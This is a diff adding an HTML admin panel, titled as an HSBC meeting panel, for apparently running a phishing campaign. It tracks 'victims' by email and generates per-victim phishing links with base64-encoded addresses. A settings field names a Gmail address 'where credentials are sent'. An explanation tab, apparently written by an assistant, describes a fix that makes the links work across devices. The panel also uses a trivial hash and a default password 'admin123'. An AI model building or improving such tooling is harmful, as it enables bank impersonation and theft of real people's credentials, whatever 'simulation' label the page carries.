@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HSBC Meeting Admin Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c 0%, #2c3e50 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 450px;
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .login-container h2 {
+            color: #0e72ed;
+            margin-bottom: 20px;
+        }
+        
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .login-form input {
+            margin-bottom: 20px;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        
+        .login-btn {
+            padding: 14px;
+            background: #0e72ed;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .login-btn:hover {
+            background: #0955b3;
+        }
+        
+        .login-error {
+            color: #dc3545;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 1000px;
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+            display: none; /* Hidden by default until login */
+        }
+        
+        .header {
+            background: #0e72ed;
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .logout-btn {
+            position: absolute;
+            right: 20px;
+            top: 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        
+        .logout-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .content {
+            display: flex;
+            flex: 1;
+        }
+        
+        .sidebar {
+            width: 250px;
+            background: #2c3e50;
+            color: white;
+            padding: 20px;
+        }
+        
+        .sidebar h3 {
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .nav-item {
+            padding: 12px 15px;
+            margin-bottom: 8px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .nav-item.active {
+            background: #0e72ed;
+        }
+        
+        .nav-item:hover {
+            background: #3a506b;
+        }
+        
+        .main-content {
+            flex: 1;
+            padding: 30px;
+            overflow-y: auto;
+            max-height: 500px;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #444;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        
+        .btn {
+            padding: 14px 20px;
+            background: #0e72ed;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .btn:hover {
+            background: #0955b3;
+        }
+        
+        .btn-secondary {
+            background: #6c757d;
+        }
+        
+        .btn-secondary:hover {
+            background: #5a6268;
+        }
+        
+        .victim-list {
+            margin-top: 30px;
+        }
+        
+        .victim-item {
+            padding: 15px;
+            border: 1px solid #e0e0e0;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .victim-info {
+            flex: 1;
+        }
+        
+        .victim-actions {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .copy-btn {
+            background: #28a745;
+        }
+        
+        .copy-btn:hover {
+            background: #218838;
+        }
+        
+        .delete-btn {
+            background: #dc3545;
+        }
+        
+        .delete-btn:hover {
+            background: #c82333;
+        }
+        
+        .alert {
+            padding: 12px 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            display: none;
+        }
+        
+        .alert-success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .alert-error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .link-display {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 20px;
+            word-break: break-all;
+        }
+        
+        .settings-group {
+            margin-bottom: 25px;
+        }
+        
+        .settings-group h4 {
+            margin-bottom: 15px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        
+        .explanation-box {
+            background: #f8f9fa;
+            border-left: 4px solid #0e72ed;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        
+        .explanation-box h4 {
+            color: #0e72ed;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Form -->
+    <div class="login-container" id="loginContainer">
+        <h2>HSBC Admin Panel Login</h2>
+        <div class="login-form">
+            <input type="password" id="passwordInput" placeholder="Enter admin password">
+            <button class="login-btn" id="loginBtn">Login</button>
+            <div class="login-error" id="loginError">Incorrect password. Please try again.</div>
+        </div>
+    </div>
+    
+    <!-- Main Application (Hidden until authenticated) -->
+    <div class="container" id="appContainer">
+        <div class="header">
+            <h1>HSBC Meeting Admin Panel</h1>
+            <p>Manage phishing simulation targets and generate links</p>
+            <button class="logout-btn" id="logoutBtn">Logout</button>
+        </div>
+        
+        <div class="content">
+            <div class="sidebar">
+                <h3>Navigation</h3>
+                <div class="nav-item active" data-tab="add-victim">Add Victim</div>
+                <div class="nav-item" data-tab="manage-victims">Manage Victims</div>
+                <div class="nav-item" data-tab="settings">Settings</div>
+                <div class="nav-item" data-tab="explanation">Link Explanation</div>
+            </div>
+            
+            <div class="main-content">
+                <div id="alertBox" class="alert"></div>
+                
+                <!-- Add Victim Tab -->
+                <div class="tab-content active" id="add-victim">
+                    <h2>Add New Victim</h2>
+                    <p>Add a target email and generate a unique phishing link</p>
+                    
+                    <div class="form-group">
+                        <label for="victimEmail">Victim Email Address</label>
+                        <input type="email" id="victimEmail" placeholder="Enter target email">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="customId">Custom ID (optional)</label>
+                        <input type="text" id="customId" placeholder="Leave blank to auto-generate">
+                    </div>
+                    
+                    <button class="btn" id="generateBtn">Generate Link</button>
+                    
+                    <div class="link-display" id="generatedLink" style="display: none;">
+                        <strong>Generated Link:</strong>
+                        <div id="linkText"></div>
+                        <button class="btn copy-btn" id="copyLinkBtn" style="margin-top: 10px;">Copy Link</button>
+                    </div>
+                </div>
+                
+                <!-- Manage Victims Tab -->
+                <div class="tab-content" id="manage-victims">
+                    <h2>Manage Victims</h2>
+                    <p>View and manage all created phishing targets</p>
+                    
+                    <div class="victim-list" id="victimList">
+                        <!-- Victim items will be added here dynamically -->
+                    </div>
+                </div>
+                
+                <!-- Settings Tab -->
+                <div class="tab-content" id="settings">
+                    <h2>Settings</h2>
+                    <p>Configure your phishing simulation settings</p>
+                    
+                    <div class="settings-group">
+                        <h4>Security Settings</h4>
+                        <div class="form-group">
+                            <label for="changePassword">Change Admin Password</label>
+                            <input type="password" id="newPassword" placeholder="Enter new password">
+                        </div>
+                        <button class="btn" id="changePasswordBtn">Change Password</button>
+                    </div>
+                    
+                    <div class="settings-group">
+                        <h4>Email Settings</h4>
+                        <div class="form-group">
+                            <label for="targetEmail">Target Email (where credentials are sent)</label>
+                            <input type="email" id="targetEmail" value="danjekwu778@gmail.com">
+                        </div>
+                    </div>
+                    
+                    <div class="settings-group">
+                        <h4>Data Management</h4>
+                        <button class="btn btn-secondary" id="exportData">Export Data</button>
+                        <button class="btn btn-secondary" id="importData" style="margin-left: 10px;">Import Data</button>
+                        <button class="btn delete-btn" id="clearData" style="margin-left: 10px;">Clear All Data</button>
+                    </div>
+                    
+                    <div class="settings-group">
+                        <h4>Domain Settings</h4>
+                        <div class="form-group">
+                            <label for="baseUrl">Base URL</label>
+                            <input type="text" id="baseUrl" placeholder="https://yourdomain.com">
+                        </div>
+                    </div>
+                    
+                    <button class="btn" id="saveSettings">Save Settings</button>
+                </div>
+                
+                <!-- Explanation Tab -->
+                <div class="tab-content" id="explanation">
+                    <h2>Why Links Don't Work on Other Devices</h2>
+                    
+                    <div class="explanation-box">
+                        <h4>The Problem</h4>
+                        <p>The links you generate contain a reference ID that points to data stored in your browser's local storage. When someone tries to access the link from another device, that device can't access the data stored on your browser.</p>
+                    </div>
+                    
+                    <div class="explanation-box">
+                        <h4>The Solution Implemented</h4>
+                        <p>I've modified the link generation to encode the target email directly into the URL using base64 encoding. Now when you generate a link, it contains all the necessary information within the URL itself, making it portable across devices.</p>
+                    </div>
+                    
+                    <div class="explanation-box">
+                        <h4>How It Works</h4>
+                        <p>When you generate a link, the target email is encoded and added as a parameter to the URL. When the link is accessed, the email is decoded from the URL parameter and used directly, without needing to access local storage.</p>
+                        <p>Example URL: <code>https://yourdomain.com?target=am9obkBleGFtcGxlLmNvbQ==</code></p>
+                        <p>Where <code>am9obkBleGFtcGxlLmNvbQ==</code> is the base64 encoded version of "john@example.com"</p>
+                    </div>
+                    
+                    <div class="explanation-box">
+                        <h4>Testing Your Links</h4>
+                        <p>To test if your links work across devices:</p>
+                        <ol>
+                            <li>Generate a link in the "Add Victim" tab</li>
+                            <li>Copy the link</li>
+                            <li>Open a new incognito/private browser window</li>
+                            <li>Paste the link into the address bar and navigate to it</li>
+                            <li>The link should work as it now contains all necessary data in the URL itself</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Password protection functionality
+        const STORAGE_KEY = 'hsbc_admin_password';
+        const SESSION_KEY = 'hsbc_admin_authenticated';
+        
+        // Initialize victim map from localStorage
+        let victimMap = {};
+        let settings = {
+            targetEmail: 'danjekwu778@gmail.com',
+            baseUrl: window.location.origin
+        };
+        
+        // DOM elements
+        const loginContainer = document.getElementById('loginContainer');
+        const appContainer = document.getElementById('appContainer');
+        const passwordInput = document.getElementById('passwordInput');
+        const loginBtn = document.getElementById('loginBtn');
+        const loginError = document.getElementById('loginError');
+        const logoutBtn = document.getElementById('logoutBtn');
+        const alertBox = document.getElementById('alertBox');
+        const victimList = document.getElementById('victimList');
+        const generatedLink = document.getElementById('generatedLink');
+        const linkText = document.getElementById('linkText');
+        const changePasswordBtn = document.getElementById('changePasswordBtn');
+        const newPasswordInput = document.getElementById('newPassword');
+        
+        // Check if user is already authenticated
+        function checkAuthentication() {
+            const isAuthenticated = sessionStorage.getItem(SESSION_KEY) === 'true';
+            if (isAuthenticated) {
+                showApp();
+            } else {
+                showLogin();
+            }
+        }
+        
+        // Show login screen
+        function showLogin() {
+            loginContainer.style.display = 'block';
+            appContainer.style.display = 'none';
+        }
+        
+        // Show application
+        function showApp() {
+            loginContainer.style.display = 'none';
+            appContainer.style.display = 'flex';
+        }
+        
+        // Hash a password (simple example - consider using a more secure method for production)
+        function hashPassword(password) {
+            // Simple hash for demonstration - in production use a more secure method like bcrypt
+            let hash = 0;
+            for (let i = 0; i < password.length; i++) {
+                const char = password.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash; // Convert to 32-bit integer
+            }
+            return hash.toString();
+        }
+        
+        // Set up the initial password if not exists
+        function initializePassword() {
+            if (!localStorage.getItem(STORAGE_KEY)) {
+                // Set default password "admin123"
+                localStorage.setItem(STORAGE_KEY, hashPassword('admin123'));
+            }
+        }
+        
+        // Verify password
+        function verifyPassword(password) {
+            const storedHash = localStorage.getItem(STORAGE_KEY);
+            return hashPassword(password) === storedHash;
+        }
+        
+        // Change password
+        function changePassword(newPassword) {
+            localStorage.setItem(STORAGE_KEY, hashPassword(newPassword));
+            showAlert('Password changed successfully!');
+            newPasswordInput.value = '';
+        }
+        
+        // Handle login
+        function handleLogin() {
+            const password = passwordInput.value;
+            if (verifyPassword(password)) {
+                sessionStorage.setItem(SESSION_KEY, 'true');
+                showApp();
+                initApp();
+            } else {
+                loginError.style.display = 'block';
+                setTimeout(() => {
+                    loginError.style.display = 'none';
+                }, 3000);
+            }
+            passwordInput.value = '';
+        }
+        
+        // Handle logout
+        function handleLogout() {
+            sessionStorage.removeItem(SESSION_KEY);
+            showLogin();
+        }
+        
+        // Base64 encoding functions
+        function base64Encode(str) {
+            return btoa(encodeURIComponent(str));
+        }
+        
+        function base64Decode(str) {
+            return decodeURIComponent(atob(str));
+        }
+        
+        // Load data from localStorage
+        function loadData() {
+            try {
+                const savedVictims = localStorage.getItem('victimMap');
+                const savedSettings = localStorage.getItem('phishSettings');
+                
+                if (savedVictims) {
+                    victimMap = JSON.parse(savedVictims);
+                }
+                
+                if (savedSettings) {
+                    settings = {...settings, ...JSON.parse(savedSettings)};
+                    document.getElementById('targetEmail').value = settings.targetEmail;
+                    document.getElementById('baseUrl').value = settings.baseUrl;
+                }
+                
+                renderVictimList();
+            } catch (e) {
+                showAlert('Error loading data from storage', 'error');
+            }
+        }
+        
+        // Save data to localStorage
+        function saveData() {
+            try {
+                localStorage.setItem('victimMap', JSON.stringify(victimMap));
+                localStorage.setItem('phishSettings', JSON.stringify(settings));
+            } catch (e) {
+                showAlert('Error saving data to storage', 'error');
+            }
+        }
+        
+        // Show alert message
+        function showAlert(message, type = 'success') {
+            alertBox.textContent = message;
+            alertBox.className = `alert alert-${type}`;
+            alertBox.style.display = 'block';
+            
+            setTimeout(() => {
+                alertBox.style.display = 'none';
+            }, 3000);
+        }
+        
+        // Generate a unique ID
+        function generateId() {
+            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                const r = Math.random() * 16 | 0;
+                const v = c === 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+        }
+        
+        // Render victim list
+        function renderVictimList() {
+            victimList.innerHTML = '';
+            
+            if (Object.keys(victimMap).length === 0) {
+                victimList.innerHTML = '<p>No victims added yet.</p>';
+                return;
+            }
+            
+            for (const [id, email] of Object.entries(victimMap)) {
+                const victimItem = document.createElement('div');
+                victimItem.className = 'victim-item';
+                victimItem.innerHTML = `
+                    <div class="victim-info">
+                        <strong>${email}</strong>
+                        <div>ID: ${id}</div>
+                    </div>
+                    <div class="victim-actions">
+                        <button class="btn copy-btn" data-id="${id}" data-email="${email}">Copy Link</button>
+                        <button class="btn delete-btn" data-id="${id}">Delete</button>
+                    </div>
+                `;
+                victimList.appendChild(victimItem);
+            }
+            
+            // Add event listeners to action buttons
+            document.querySelectorAll('.copy-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const id = this.getAttribute('data-id');
+                    const email = this.getAttribute('data-email');
+                    copyVictimLink(id, email);
+                });
+            });
+            
+            document.querySelectorAll('.delete-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const id = this.getAttribute('data-id');
+                    deleteVictim(id);
+                });
+            });
+        }
+        
+        // Generate victim link (now with encoded email in URL)
+        function generateVictimLink() {
+            const email = document.getElementById('victimEmail').value.trim();
+            let customId = document.getElementById('customId').value.trim();
+            
+            if (!email) {
+                showAlert('Please enter a valid email address', 'error');
+                return;
+            }
+            
+            // Use custom ID or generate one
+            const id = customId || generateId();
+            
+            // Add to victim map
+            victimMap[id] = email;
+            saveData();
+            
+            // Generate the link with encoded email
+            const baseUrl = settings.baseUrl || window.location.origin;
+            // Encode the email in base64 and include it in the URL
+            const encodedEmail = base64Encode(email);
+            const link = `${baseUrl}?requestID=${id}&target=${encodedEmail}`;
+            
+            // Display the link
+            linkText.textContent = link;
+            generatedLink.style.display = 'block';
+            
+            showAlert('Link generated successfully! This link will work on any device.');
+            
+            // Clear the form
+            document.getElementById('victimEmail').value = '';
+            document.getElementById('customId').value = '';
+            
+            // Update victim list
+            renderVictimList();
+        }
+        
+        // Copy victim link to clipboard (updated to include encoded email)
+        function copyVictimLink(id, email) {
+            const baseUrl = settings.baseUrl || window.location.origin;
+            // Encode the email in base64 and include it in the URL
+            const encodedEmail = base64Encode(email);
+            const link = `${baseUrl}?requestID=${id}&target=${encodedEmail}`;
+            
+            navigator.clipboard.writeText(link).then(() => {
+                showAlert('Link copied to clipboard! This link will work on any device.');
+            }).catch(err => {
+                showAlert('Failed to copy link', 'error');
+            });
+        }
+        
+        // Delete a victim
+        function deleteVictim(id) {
+            if (confirm('Are you sure you want to delete this victim?')) {
+                delete victimMap[id];
+                saveData();
+                renderVictimList();
+                showAlert('Victim deleted successfully');
+            }
+        }
+        
+        // Save settings
+        function saveSettings() {
+            settings.targetEmail = document.getElementById('targetEmail').value;
+            settings.baseUrl = document.getElementById('baseUrl').value;
+            saveData();
+            showAlert('Settings saved successfully');
+        }
+        
+        // Export data
+        function exportData() {
+            const dataStr = JSON.stringify({victimMap, settings}, null, 2);
+            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+            
+            const exportFileDefaultName = 'phishing-data.json';
+            
+            const linkElement = document.createElement('a');
+            linkElement.setAttribute('href', dataUri);
+            linkElement.setAttribute('download', exportFileDefaultName);
+            linkElement.click();
+        }
+        
+        // Import data
+        function importData() {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = '.json';
+            
+            input.onchange = e => {
+                const file = e.target.files[0];
+                const reader = new FileReader();
+                
+                reader.onload = function(e) {
+                    try {
+                        const data = JSON.parse(e.target.result);
+                        victimMap = data.victimMap || {};
+                        settings = {...settings, ...data.settings};
+                        
+                        // Update form fields
+                        document.getElementById('targetEmail').value = settings.targetEmail;
+                        document.getElementById('baseUrl').value = settings.baseUrl;
+                        
+                        saveData();
+                        renderVictimList();
+                        showAlert('Data imported successfully');
+                    } catch (err) {
+                        showAlert('Error importing data', 'error');
+                    }
+                };
+                
+                reader.readAsText(file);
+            };
+            
+            input.click();
+        }
+        
+        // Clear all data
+        function clearData() {
+            if (confirm('Are you sure you want to clear all data? This cannot be undone.')) {
+                victimMap = {};
+                localStorage.removeItem('victimMap');
+                renderVictimList();
+                showAlert('All data cleared');
+            }
+        }
+        
+        // Tab navigation
+        function setupTabs() {
+            const navItems = document.querySelectorAll('.nav-item');
+            const tabContents = document.querySelectorAll('.tab-content');
+            
+            navItems.forEach(item => {
+                item.addEventListener('click', function() {
+                    const tabId = this.getAttribute('data-tab');
+                    
+                    // Update active nav item
+                    navItems.forEach(nav => nav.classList.remove('active'));
+                    this.classList.add('active');
+                    
+                    // Show selected tab
+                    tabContents.forEach(tab => tab.classList.remove('active'));
+                    document.getElementById(tabId).classList.add('active');
+                });
+            });
+        }
+        
+        // Initialize the application
+        function initApp() {
+            loadData();
+            setupTabs();
+            
+            // Event listeners
+            document.getElementById('generateBtn').addEventListener('click', generateVictimLink);
+            document.getElementById('copyLinkBtn').addEventListener('click', function() {
+                navigator.clipboard.writeText(linkText.textContent).then(() => {
+                    showAlert('Link copied to clipboard! This link will work on any device.');
+                });
+            });
+            
+            document.getElementById('saveSettings').addEventListener('click', saveSettings);
+            document.getElementById('exportData').addEventListener('click', exportData);
+            document.getElementById('importData').addEventListener('click', importData);
+            document.getElementById('clearData').addEventListener('click', clearData);
+            changePasswordBtn.addEventListener('click', () => {
+                if (newPasswordInput.value) {
+                    changePassword(newPasswordInput.value);
+                } else {
+                    showAlert('Please enter a new password', 'error');
+                }
+            });
+        }
+        
+        // Start the authentication process
+        function init() {
+            initializePassword();
+            checkAuthentication();
+            
+            // Event listeners for authentication
+            loginBtn.addEventListener('click', handleLogin);
+            passwordInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    handleLogin();
+                }
+            });
+            logoutBtn.addEventListener('click', handleLogout);
+        }
+        
+        // Start the application when the DOM is loaded
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
